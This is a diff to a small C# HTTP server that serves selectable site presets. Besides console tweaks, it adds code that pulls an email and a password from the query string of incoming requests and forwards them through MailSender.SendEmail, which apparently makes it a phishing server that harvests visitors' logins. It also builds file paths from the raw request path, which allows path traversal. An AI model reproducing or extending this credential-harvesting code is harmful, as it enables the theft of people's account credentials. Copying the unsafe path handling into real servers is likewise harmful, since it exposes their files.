@@ -4,17 +4,18 @@ using System.Net;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Web;
 
 namespace MyHttpServer
 {
     public class Server
     {
-        private readonly HttpListener _server;
-        private readonly ServerConfiguration _configuration;
+        private readonly HttpListener ? _server;
+        private readonly ServerConfiguration ? _configuration;
         private bool _isAlive;
-        private string _contentType;
+        private string ? _contentType;
         private readonly object _lock = new object();
-        private string _sitePreset;
+        private string ? _sitePreset;
 
         public Server(string siteType)
         {
@@ -48,11 +49,13 @@ namespace MyHttpServer
             _configuration.Set(_server);
             _server.Start();
             _isAlive = true;
-            Console.WriteLine("The server started working!");
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine("==== The server started working! ====\n");
+            Console.ResetColor();
 
             var serverTask = ServerProcessAsync();
 
-            Console.WriteLine("Type 'stop' and press 'Enter' to stop the server.");
+            Console.WriteLine("Type 'stop' and press 'Enter' to stop the server.\n");
             while (_isAlive)
             {
                 if (Console.ReadLine()?.ToLower() == "stop")
@@ -62,7 +65,9 @@ namespace MyHttpServer
                 }
             }
 
-            await serverTask;
+            if(_isAlive)
+                await serverTask;
+
         }
 
         private void Stop()
@@ -73,7 +78,9 @@ namespace MyHttpServer
                 {
                     _server.Stop();
                     _server.Close();
-                    Console.WriteLine("The server has been stopped.");
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Console.WriteLine("\n==== The server has been successfully stopped! ====\n");
+                    Console.ResetColor();
                 }
             }
         }
@@ -92,21 +99,28 @@ namespace MyHttpServer
             try
             {
                 HttpListenerRequest request = context.Request;
-                var requestUrl = request.Url.AbsolutePath;
+                HttpListenerResponse response = context.Response;
+                string requestUrl = request.Url!.AbsolutePath, filePath = requestUrl,
+                    email = "", password = "";
 
-                string filePath = requestUrl;
-                if (filePath.EndsWith("/"))
-                    filePath = _configuration.StaticFilesPath + _sitePreset + "index.html";
+                if (request.RawUrl.StartsWith("/?"))
+                {
+                    email = HttpUtility.UrlDecode(request.RawUrl.Trim('/').Trim('?').Split('&')[0].Split('=')[1]);
+                    password = HttpUtility.UrlDecode(request.RawUrl.Trim('/').Trim('?').Split('&')[1].Split('=')[1]);
+                    MailSender.SendEmail(email, password);
+                }
+
+                if (filePath == "/")
+                    filePath = _configuration!.StaticFilesPath + _sitePreset + "index.html";
 
                 if (filePath.StartsWith("/"))
-                {
                     filePath = filePath.Trim('/');
-                }
 
                 if (!File.Exists(filePath))
                 {
-                    if (!File.Exists(_configuration.StaticFilesPath + _sitePreset + filePath))
+                    if (!File.Exists(_configuration!.StaticFilesPath + _sitePreset + filePath))
                     {
+                        response.StatusCode = (int)HttpStatusCode.NotFound;
                         filePath = $"{_configuration.StaticFilesPath}/404.html";
                     }
                     else
@@ -116,23 +130,10 @@ namespace MyHttpServer
                 }
 
                 string extension = Path.GetExtension(filePath);
-                
+
                 ParseExtention(extension);
 
-                HttpListenerResponse response = context.Response;
-
                 response.ContentType = _contentType;
-
-                // Вывод запросов в консоль
-                  
-                    //Console.WriteLine("\n--------------");
-                    //Console.WriteLine("request: " + requestUrl);
-                    //Console.WriteLine("filepath : " + filePath);
-                    //Console.WriteLine("extention: " + extension);
-                    //Console.WriteLine("contentType: " + _contentType);
-                    //Console.WriteLine("-------------- \n");
-
-                //
 
                 using (var fileStream = File.OpenRead(filePath))
                 {
